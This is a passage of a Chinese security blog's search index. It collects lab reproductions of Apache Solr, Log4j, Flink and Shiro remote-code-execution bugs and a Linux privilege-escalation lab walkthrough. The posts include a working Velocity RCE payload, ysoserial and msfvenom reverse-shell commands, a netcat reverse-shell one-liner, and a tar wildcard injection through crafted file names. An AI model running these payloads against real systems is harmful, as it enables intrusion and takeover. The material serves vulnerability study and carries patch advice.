5.0.0 \u003c= Apache Solr \u003c= 8.3.1 ","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["漏洞复现","Solr"],"title":"Apache Solr模板注入远程代码执行漏洞","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"环境搭建 可用 vulhub 的 solr 环境进行复现 docker-compose up -d docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 将 contrib/velocity/lib 中以 velocity 开头的 jar包复制到 server/solr-webapp/webapp/WEB-INF/lib/ 下: 重启 solr 服务。 ","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["漏洞复现","Solr"],"title":"Apache Solr模板注入远程代码执行漏洞","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"漏洞复现 在满足以上环境条件的情况下，利用此漏洞分两步骤。先通过一个 HTTP 请求将 params.resource.loader.enabled 这个关键的参数设置 true，这样就能允许任意的模板代码从用户的 HTTP 请求中指定。然后再通过指定任意 Velocity 模板代码执行任意命令。由于 Solr 默认未开启认证，在这种情况下，此漏洞利用不需要登录凭据。 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } 发送 payload： 访问：http://IP:8983/solr/test/select?q=1\u0026wt=velocity\u0026v.template=custom\u0026v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end 执行 id 命令的返回结果： ","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["漏洞复现","Solr"],"title":"Apache Solr模板注入远程代码执行漏洞","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"修复建议 升级到 Apache Solr 8.4 ","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["漏洞复现","Solr"],"title":"Apache Solr模板注入远程代码执行漏洞","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"Apache Log4j SocketServer反序列化漏洞复现","date":"2019-12-30","objectID":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/","tags":["漏洞复现","Log4j SocketServer"],"title":"Apache Log4j SocketServer反序列化漏洞复现","uri":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/"},{"categories":["漏洞复现"],"content":"Apache Log4j SocketServer 反序列化漏洞复现 Apache Log4j 是一个基于 Java 的日志记录工具，是 Apache 软件基金会的一个项目，是几种 Java 日志框架之一。 近日，Apache Log4j 官方披露在 1.2.x 版本中的SocketServer类存在反序列化漏洞（CVE-2019-17571），攻击者可利用漏洞可实现远程代码执行。 Log4j 1.2.x 版本中的 org.apache.log4j.net.SocketServer 类，存在反序列化漏洞。使用 Log4j SocketServer 类创建的 Socket 监听服务处理接受数据时，容易对不可信数据进行反序列化，结合反序列化小工具，攻击者可以实现远程代码执行。 ","date":"2019-12-30","objectID":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/:0:0","tags":["漏洞复现","Log4j SocketServer"],"title":"Apache Log4j SocketServer反序列化漏洞复现","uri":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/"},{"categories":["漏洞复现"],"content":"环境搭建 用到的 jar 包: java -cp log4j-1.2.17.jar:commons-collections-3.1.jar org.apache.log4j.net.SocketServer 8888 ./log4jserver.properties ./ ","date":"2019-12-30","objectID":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/:1:0","tags":["漏洞复现","Log4j SocketServer"],"title":"Apache Log4j SocketServer反序列化漏洞复现","uri":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/"},{"categories":["漏洞复现"],"content":"漏洞复现 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \"open -a Calculator\" | nc 127.0.0.1 8888 发送 payload 后，成功弹出计算器： ","date":"2019-12-30","objectID":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/:2:0","tags":["漏洞复现","Log4j SocketServer"],"title":"Apache Log4j SocketServer反序列化漏洞复现","uri":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/"},{"categories":["漏洞复现"],"content":"修复建议 Apache Log4j 的 1.2 系列版本官方在2015年8月已停止维护，在 2.8.2 版本中已修复了该漏洞，建议尽快升级到 2.8.2 或更高的版本； 下载地址：https://logging.apache.org/log4j/2.x/download.html 停止使用 Log4j 的 SocketServer 类创建 Socket 服务，未使用 Log4j 的 SocketServer 类的功能不受漏洞影响； ","date":"2019-12-30","objectID":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/:3:0","tags":["漏洞复现","Log4j SocketServer"],"title":"Apache Log4j SocketServer反序列化漏洞复现","uri":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/"},{"categories":["漏洞复现"],"content":"Apache Solr CVE-2019-12409 RCE 漏洞复现","date":"2019-11-20","objectID":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["漏洞复现","Solr"],"title":"CVE-2019-12409 漏洞复现","uri":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"Apache Solr CVE-2019-12409 RCE 漏洞复现 该漏洞源于默认配置文件 solr.in.sh 中的 ENABLE_REMOTE_JMX_OPTS 配置选项存在安全风险。 如果使用受影响版本中的默认 solr.in.sh 文件，那么将启用JMX监视并将其暴露在 RMI_PORT 上（默认值 = 18983），并且无需进行任何身份验证。 如果防火墙中的入站流量打开了此端口，则具有 Solr 节点网络访问权限的任何人都将能够访问 JMX，并且可以上传恶意代码在 Solr 服务器上执行。 该漏洞不影响 Windows 系统的用户,仅影响部分版本的 Linux 用户。 ","date":"2019-11-20","objectID":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["漏洞复现","Solr"],"title":"CVE-2019-12409 漏洞复现","uri":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"环境搭建 写入 docker-compose.yml 文件： version:'2'services:solr:image:vulhub/solr:8.1.1ports:- \"8983:8983\"- \"18983:18983\" 运行漏洞环境： docker-compose up -d docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 查看 Docker 靶机环境是否开启了漏洞配置： docker ps -a #查看当前运行容器的CONTAINER ID docker exec -it CONTAINER ID /bin/bash #docker的solr的配置文件默认在/etc/default里面 cat /etc/default/solr.in.sh |grep true #如下图显示即为开启的漏洞配置 浏览器访问：http://IP:8983，即可查看到 Apache solr 的管理页面，无需登录。 ","date":"2019-11-20","objectID":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["漏洞复现","Solr"],"title":"CVE-2019-12409 漏洞复现","uri":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"漏洞复现 打开 msf，配置 payload 设置攻击者与受害者 IP 执行 ","date":"2019-11-20","objectID":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["漏洞复现","Solr"],"title":"CVE-2019-12409 漏洞复现","uri":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"Apache Flink 任意 Jar 包上传导致 RCE 漏洞复现","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/","tags":["Flink","漏洞复现"],"title":"Apache Flink 任意 Jar 包上传导致 RCE 漏洞","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"Apache Flink 任意 Jar 包上传导致 RCE 漏洞 Apache Flink 是一个分布式大数据处理引擎，可对有限数据流和无限数据流进行有状态计算。可部署在各种集群环境，对各种大小的数据规模进行快速计算。 ApacheFlink 是由 Apache 软件基金会开发的开源流处理框架，其核心是用 Java 和 Scala 编写的分布式流数据流引擎。Flink 以数据并行和流水线方式执行任意流数据程序，Flink 的流水线运行时系统可以执行批处理和流处理程序。此外，Flink 的运行时本身也支持迭代算法的执行。 攻击者可利用该漏洞在 Apache Flink Dashboard 页面中上传任意 Jar 包，利用 Metasploit 在Apache Flink 服务器中执行任意代码，获取服务器最高权限，所以危害性较大。 ","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/:0:0","tags":["Flink","漏洞复现"],"title":"Apache Flink 任意 Jar 包上传导致 RCE 漏洞","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"影响范围 Apache Flink \u003c= 1.9.1 ","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/:1:0","tags":["Flink","漏洞复现"],"title":"Apache Flink 任意 Jar 包上传导致 RCE 漏洞","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"环境搭建 下载 Apache Flink 1.9.1 包： wget http://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz 解压安装包： tar –zxvf flink-1.9.1-bin-scala_2.11.tgz 进入到 bin 目录下面启动 Flink： ./start-cluster.sh 浏览器访问：http://IP:8081 ","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/:2:0","tags":["Flink","漏洞复现"],"title":"Apache Flink 任意 Jar 包上传导致 RCE 漏洞","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"漏洞复现 msf 生成 reverse shell 的马 msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f jar \u003e shell.jar msf 设置监听 use exploit/multi/handler set payload java/shell/reverse_tcp expolit 上传 shell.jar 并提交 反弹回的 shell ","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/:3:0","tags":["Flink","漏洞复现"],"title":"Apache Flink 任意 Jar 包上传导致 RCE 漏洞","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"修复建议 将 Apache Flink 升级最新版本 ","date":"2019-11-20","objectID":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/:4:0","tags":["Flink","漏洞复现"],"title":"Apache Flink 任意 Jar 包上传导致 RCE 漏洞","uri":"/2019/11/flink%E4%BB%BB%E6%84%8Fjar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4rce%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"Apache Shiro padding oracle attack漏洞复现","date":"2019-11-18","objectID":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["漏洞复现","Shiro"],"title":"Apache Shiro padding oracle attack漏洞复现","uri":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"Apache Shiro padding oracle attack漏洞复现 Shiro 使用了 AES-128-CBC 模式对 cookie 进行加密，导致恶意用户可以通过 padding oracle 攻击方式构造序列化数据进行反序列化攻击。 例如之前爆出来的 SHIRO-550 漏洞就是关于 remember 这个cookie 的问题。 ","date":"2019-11-18","objectID":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["漏洞复现","Shiro"],"title":"Apache Shiro padding oracle attack漏洞复现","uri":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"环境搭建 shiro 打包环境下载地址 https://github.com/jas502n/SHIRO-721 exp 下载地址 https://github.com/Geekby/shiro_rce_exp 复现环境：ubuntu16.04 + tomcat8 + shiro 1.4.1 apt-get install tomcat8 tomcat8-docs tomcat8-examples tomcat8-admin 然后将下载好的 samples-web-1.4.1.war 包部署到 tomcat 上。 ","date":"2019-11-18","objectID":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["漏洞复现","Shiro"],"title":"Apache Shiro padding oracle attack漏洞复现","uri":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"漏洞复现 访问shiro登录页面 输入用户名密码，点击 Remember Me 访问任意页面，得到 Cookie 中的 rememberMe 生成 java class payload 执行exp 得到padding oracle attack后的cookie 注：破解时间较长，大概持续100min - 120min左右。 复制该cookie，重放数据包 检查执行结果 发现success文件成功被创建，命令可以被执行 ","date":"2019-11-18","objectID":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["漏洞复现","Shiro"],"title":"Apache Shiro padding oracle attack漏洞复现","uri":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"参考 https://www.anquanke.com/post/id/192819 https://github.com/jas502n/SHIRO-721 https://github.com/wuppp/shiro_rce_exp ","date":"2019-11-18","objectID":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["漏洞复现","Shiro"],"title":"Apache Shiro padding oracle attack漏洞复现","uri":"/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["靶场"],"content":"in.security 提权靶场","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"in.security 提权靶场 lin.security 靶场 是 Linux 配置问题导致提权的靶场，它基于Ubuntu（18.04 LTS）的 Linux 虚拟机，靶场提供许多权限提升的漏洞供我们练习关于 linux 权限的相关知识，下面是这个靶场的下载链接： https://in.security/downloads/lin.security_v1.0.ova 靶场低权限用户：bob:secret 查看当前用户的权限：whoami、id 查看系统的发行版本和内核版本：lsb_release -a、uname -a ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:0:0","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"1 linux 下的权限划分 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:0","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"1.1 用户和组 用户组在 linux 系统上起着重要作用，它们为选定的用户提供了一种彼此共享文件的简便方法。它们还使系统管理员可以更有效地管理用户权限，因为他们可以将权限分配给组而不是单个用户。 Linux 用户分为管理员和普通用户，普通用户又分为系统用户和自定义用户。 系统管理员：即 root 帐户，UID 号为 0，拥有所有系统权限，它类似于 Windows 系统中的 administrator 帐户，是整个系统的所有者。 系统用户：Linux 为满足自身系统管理所内建的账号，通常在安装过程中自动创建，不能用于登录操作系统。UID 在 1-499 之间(Centos 7 为 1-999 之间)。像上面的 sshd、 pulse 等等用户即是此类用户。它类似于 Windows 中的 system 帐户，当然权限远没有 system 帐户高。 自定义用户：由 root 管理员创建供用户登录系统进行操作使用的账号，UID 在 500 以上(CentOS7 为 1000 以上)。它类似于 Windows 系统中 users 用户组中的帐户。 在 Linux 中的每个用户必须属于一个组，不能独立于组外在 Linux 中每个文件有所有者、所在组、其它组的概念同样，用户组的信息我们可以在 /etc/group 中查看 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:1","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"1.2 /etc/passwd 文件 在 Linux 的 /etc/passwd 文件中每个用户都有一个对应的记录行，它记录了这个用户的一些基本属性。系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。 给 linux 系统添加账户：useradd -g group -d /home/to/user -m username 字段含义： ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:2","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"1.3 /etc/shadow 文件 字段含义： 用户名:加密密码(! ! 表示无密码):最后一次修改时间:最小修改时间间隔:密码有效期:密码需要变更前的警告天数:密码过期后的宽限时间:账号失效时间:保留字段 加密的密码具有固定格式： $id$salt$encrypted id 表示加密算法，1 代表 MD5，5 代表 SHA-256，6 代表 SHA-512 salt 为盐值，系统随机生成 encrypted 表示密码的 hash 值 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:3","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"1.4 文件权限 linux 系统中，一切皆文件，包括普通文件、目录、设备、套接字等 rwx对目录的权限 r：表示具有读取目录结构列表的权限，表示可以查询该目录下的文件名数据。 即可以 ls w：表示可以对该文件夹下的文件或目录进行添加、删除、重命名、复制、剪切等操作 x：表示可以用户能否进入该目录成为工作目录（当没有 x 权限，但是有 w 权限时，也是无法向文件写入文件的） ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:4","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"1.5 特殊权限 SUID 该文件在执行的时候，会切换到所有者的权限执行 SGID 该文件在执行的时候，会切换到所有组的权限执行 SBIT 只有自己和管理员可以操作当前文件 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:1:5","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"2 sudo 权限配置不当提权 sudo 其实是很常用的命令了，sudo 权限则是 root 把本来只能超级用户执行的命令赋予普通用户执行，这里的命令指的是系统命令，对于 linux 来说一切皆是文件，所以系统命令也是一个文件。 一般来讲当管理员需要某个用户在执行 root 权限的命令时，会去配置 sudo。具体是修改 /etc/sudoers 这个文件。但是普通用户其实是查看和操作这个文件的，他只能查看自己是否被配置了 sudo 权限。普通用户可以采用 sudo -l 这个命令来查看自己是否有 sudo 配置。 bob 这个用户可以执行很多的命令，利用这些命令可以简单直接提升到 root 权限。 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:2:0","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"2.1 /bin/ash ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:2:1","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"2.2 /usr/bin/awk 查看密码文件 /etc/shadow ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:2:2","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"2.3 /usr/bin/curl ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:2:3","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"2.4 /usr/bin/find 获取shell find . -exec /bin/sh \\; -quit 可以发现，哪怕是 find 这种查找命令被赋予了 sudo，也能提权为 root 权限，只要我们能够巧妙的利用执行这些命令。限于篇幅，就不给出所有命令的利用方式了，我们可以参考资源 https://gtfobins.github.io/ ，里面涵盖了许多可以被利用的命令。 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:2:4","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"3 /etc/passwd的哈希 linux 的用户密码哈希存储在 /etc/shadow 这个文件，而这个文件普通用户是无法查看的。而普通用户能够查看到的则是 /etc/passwd 这个文件。如果我们查看 /etc/passwd 通常会看到以下内容： root❌0:0:root:/root:/bin/bash 如果有一个账户的第二列是密码哈希，如果该列为 x 则代表密码哈希存储在 /etc/shadow 文件上。而在 lin.security 虚拟机上可以看到像 insecurity 这么一个账户，这个账号的 uid 和 gid 都为 0。用类似 Johnny 或者 hash-identifier 会被表示成 descrypt，进而可以被破解出来。 通过查询，可得密码为P@ssw0rd11。 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:3:0","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"4 利用定时任务cron以及通配符 每隔1分钟定期执行 /etc/cron.daily/backup 这个文件。 这里涉及到了利用通配符进行 Linux 本地提权，我们需要另开一个 bob 的 ssh 会话。 使用 msfvenom 生成 nc 反弹一句话，命令如下： -p：payload R：RAW 原始数据 root@kali:~# msfvenom -p cmd/unix/reverse_netcat lhost=127.0.0.1 lport=8888 R [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder or badchars specified, outputting raw payload Payload size: 91 bytes mkfifo /tmp/kuhdq; nc 127.0.0.1 8888 0\u003c/tmp/kuhdq | /bin/sh \u003e/tmp/kuhdq 2\u003e\u00261; rm /tmp/kuhdq 然后分别执行： bob@linsecurity:~$ echo \"mkfifo /tmp/kuhdq; nc 127.0.0.1 8888 0\u003c/tmp/kuhdq | /bin/sh \u003e/tmp/kuhdq 2\u003e\u00261; rm /tmp/kuhdq\" \u003e shell.sh \u0026\u0026 chmod +x shell.sh bob@linsecurity:~$ echo \"\" \u003e \"--checkpoint-action=exec=sh shell.sh\" bob@linsecurity:~$ echo \"\" \u003e --checkpoint=1 我们在另外一个会话终端开启 nc 监听： nc -lvnp 8888 –checkpoint[=NUMBER] 显示每个Numbers记录的进度消息（默认值为10） –checkpoint-action=ACTION 在每个checkpoint（检查点）上执行ACTION 这里的 –checkpoint-action 选项，用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，选项 –checkpoint=1 和 –checkpoint-action=exec=sh shell.sh 作为命令行选项交给了 tar 程序。 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:4:0","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"5 利用隐藏文件 有时候隐藏文件会存放一些重要的信息，比如我们搜索 home 目录下的所有隐藏文件，并用 ls -al 显示出来。 find / -name \".*\" -type f -path \"/home/*\" -exec ls -al {} \\; 2\u003e/dev/null 发现了 susan 这个用户有一个 .secret 的隐藏文件，发现里面存放 susan 这个用户的登陆密码。 ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:5:0","tags":["提权","提权靶场"],"title":"in.security 提权靶场","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"6 利用 SUID ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:6:0","tags":["提权","提权靶场"],"title":"in.security 